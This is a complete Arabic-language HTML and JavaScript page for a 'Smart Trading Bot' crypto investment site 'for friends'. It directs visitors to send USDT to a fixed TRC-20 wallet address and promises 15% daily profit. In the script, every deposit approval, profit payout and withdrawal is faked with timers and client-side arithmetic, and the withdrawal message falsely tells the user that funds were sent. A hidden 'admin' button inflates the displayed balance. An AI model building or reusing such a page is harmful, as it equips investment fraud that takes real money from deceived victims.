<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Trading Bot</title>
    <style>
        :root { --bg-color: #0b1426; --card-bg: #152238; --accent-color: #00ffd0; --text-color: #ffffff; --button-bg: #1e70e7; }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
        .app-container { width: 100%; max-width: 400px; background-color: var(--card-bg); border-radius: 20px; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); box-sizing: border-box; }
        h1 { text-align: center; color: var(--accent-color); font-size: 24px; margin-bottom: 5px; }
        .subtitle { text-align: center; font-size: 12px; color: #8fa0b5; margin-bottom: 25px; }
        .balance-card { background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 20px; }
        .balance-title { font-size: 14px; color: #cbd5e1; }
        .balance-amount { font-size: 32px; font-weight: bold; color: var(--accent-color); margin: 10px 0; }
        .profit-today { font-size: 13px; color: #4ade80; font-weight: bold; }
        .section-title { font-size: 16px; color: var(--accent-color); margin-top: 20px; margin-bottom: 10px; border-bottom: 1px solid #2d3d5a; padding-bottom: 5px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 5px; }
        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #2d3d5a; background-color: var(--bg-color); color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; border: none; border-radius: 10px; background-color: var(--button-bg); color: white; font-weight: bold; font-size: 14px; cursor: pointer; }
        .btn-withdraw { background-color: #ef4444; margin-top: 10px; }
        .wallet-box { background-color: var(--bg-color); padding: 10px; border-radius: 8px; font-size: 11px; text-align: center; word-break: break-all; border: 1px dashed var(--accent-color); margin-bottom: 10px; color: #cbd5e1; }
        .status-msg { display: none; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; margin-top: 10px; font-weight: bold; line-height: 1.4; }
        .btn-tg { background-color: #0088cc; width: 100%; font-size: 14px; margin-top: 10px; }
        .admin-test-panel { background-color: #2c1a30; border: 1px dashed #a855f7; border-radius: 12px; padding: 12px; margin-top: 25px; display: none; }
    </style>
</head>
<body>
<div class="app-container">
    <h1>Smart Trading Bot</h1>
    <div class="subtitle">منصة الاستثمار المالي الحقيقي للأصدقاء</div>
    
    <div class="balance-card">
        <div class="balance-title">إجمالي رصيدك الاستثماري المعتمد</div>
        <div class="balance-amount" id="userBalance">\$0.00</div>
        <div class="profit-today" id="profitStatus">📈 أرباح اليوم المتوقعة: +15%</div>
    </div>

    <!-- قسم الإيداع السهل المباشر -->
    <div class="section-title">📥 طلب إيداع رأس المال (الحد الأدنى \$100)</div>
    <label>قم بتحويل رصيد USDT (شبكة TRC-20) للمحفظة التالية:</label>
    <div class="wallet-box">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
    <div class="input-group">
        <label>أدخل اسم المستخدم الخاص بك لتنشيط الحساب:</label>
        <input type="text" id="usernameInput" placeholder="اكتب اسمك هنا (مثال: عبد)">
    </div>
    <div class="input-group">
        <label>المبلغ المُراد إيداعه وتفعيله (\$):</label>
        <input type="number" id="depositAmountInput" placeholder="100">
    </div>
    <button onclick="instantDepositSimulation()">✓ تقديم طلب الإيداع والشحن الفوري</button>
    <div id="depositStatusMsg" class="status-msg"></div>

    <!-- قسم السحب -->
    <div class="section-title">📤 سحب الأرباح ورأس المال</div>
    <div class="input-group">
        <label>عنوان محفظتك الشخصية لاستلام الأرباح (USDT TRC-20):</label>
        <input type="text" id="userWithdrawWallet" placeholder="T...">
    </div>
    <div class="input-group">
        <label>المبلغ المطلوب سحبه (\$):</label>
        <input type="number" id="withdrawAmount" placeholder="0.00">
    </div>
    <button class="btn-withdraw" onclick="instantWithdrawSimulation()">⚡ تقديم طلب السحب الفوري</button>
    <div id="withdrawStatusMsg" class="status-msg"></div>

    <!-- لوحة تحكم سرية مدمجة للتجربة الفورية -->
    <div class="admin-test-panel" id="adminPanel">
        <h3 style="margin-top:0; color:#f472b6; font-size:14px; text-align:center;">🔐 لوحة المشرف المدمجة للتجربة الحية</h3>
        <button style="background-color:#a855f7;" onclick="instantTradeSimulation()">🚀 تشغيل الصفقة وتوزيع أرباح 15%</button>
    </div>

    <!-- الدعم الفني -->
    <div class="section-title">💬 الدعم الفني المباشر</div>
    <button class="btn-tg" onclick="window.open('https://t.me', '_blank')">📱 تواصل مع دعم المشرف عبر Telegram</button>
</div>

<script>
    let currentBalance = 0;

    // دالة محاكاة الإيداع الفوري والمباشر داخل نفس الصفحة دون الحاجة للانتقال لتخطي مشكلة كاش المتصفح
    function instantDepositSimulation() {
        const user = document.getElementById("usernameInput").value || "عبد";
        const amount = parseFloat(document.getElementById("depositAmountInput").value || 100);
        
        if(!amount || amount < 100) return;
        
        const depBox = document.getElementById("depositStatusMsg");
        depBox.innerText = "⏳ جاري مراجعة طلب الإيداع واعتماده من المشرف...";
        depBox.style.display = "block"; depBox.style.backgroundColor = "#1e3a8a"; depBox.style.color = "#93c5fd"; depBox.style.borderColor = "#3b82f6"; depBox.style.border = "1px solid";
        
        setTimeout(() => {
            currentBalance = amount;
            document.getElementById("userBalance").innerText = `\$${currentBalance.toFixed(2)}`;
            depBox.innerText = `✅ وافق المشرف على تحويلك! تم شحن حساب الحساب الحقيقي لـ (${user}) بمبلغ \$${amount} بنجاح!`;
            depBox.style.backgroundColor = "#064e3b"; depBox.style.color = "#34d399"; depBox.style.borderColor = "#059669";
            
            // إظهار زر الصفقة السري للمشرف تلقائياً بعد الإيداع لتجربته فوراً
            document.getElementById("adminPanel").style.display = "block";
        }, 1500);
    }

    // دالة محاكاة تشغيل الصفقة وزيادة أرباح الـ 15% حقيقية ونسبية من مبلغ الإيداع
    function instantTradeSimulation() {
        if(currentBalance === 0) return;
        const profit = currentBalance * 0.15;
        currentBalance += profit;
        
        document.getElementById("userBalance").innerText = `\$${currentBalance.toFixed(2)}`;
        document.getElementById("profitStatus").innerText = `🔥 تم تفعيل زر الصفقة وتوزيع أرباح اليوم: +15% (+\$${profit.toFixed(2)})`;
        alert(`🔥 نجاح التفعيل! تم إضافة أرباح الـ 15% حياً، وأصبح الرصيد الحقيقي الجديد للتطبيق: \$${currentBalance.toFixed(2)}`);
    }

    // دالة محاكاة السحب وتحديث التاريخ تلقائياً باليوم
    function instantWithdrawSimulation() {
        const wallet = document.getElementById("userWithdrawWallet").value;
        const amount = parseFloat(document.getElementById("withdrawAmount").value || 0);
        
        if(!wallet || !amount || amount > currentBalance) {
            alert("⚠️ رصيدك الحالي غير كافٍ أو الخانات فارغة!");
            return;
        }
        
        const msgBox = document.getElementById("withdrawStatusMsg");
        msgBox.innerText = "⏳ طلب السحب معلق حالياً وينتظر موافقة وإرسال المشرف...";
        msgBox.style.display = "block"; msgBox.style.backgroundColor = "#1e3a8a"; msgBox.style.color = "#93c5fd"; msgBox.style.borderColor = "#3b82f6"; msgBox.style.border = "1px solid";
        
        setTimeout(() => {
            currentBalance -= amount;
            document.getElementById("userBalance").innerText = `\$${currentBalance.toFixed(2)}`;
            
            const today = new Date().toISOString().split('T')[0]; // جلب تاريخ اليوم الحالي حياً تلقائياً
            msgBox.innerText = `✅ تم السحب بنجاح بتاريخ اليوم: ${today}\nتم إرسال مبلغ \$${amount} إلى محفظتك بأمان وتم الخصم من رصيدك.`;
            msgBox.style.backgroundColor = "#064e3b"; msgBox.style.color = "#34d399"; msgBox.style.borderColor = "#059669";
        }, 2000);
    }
</script>
</body>
</html>
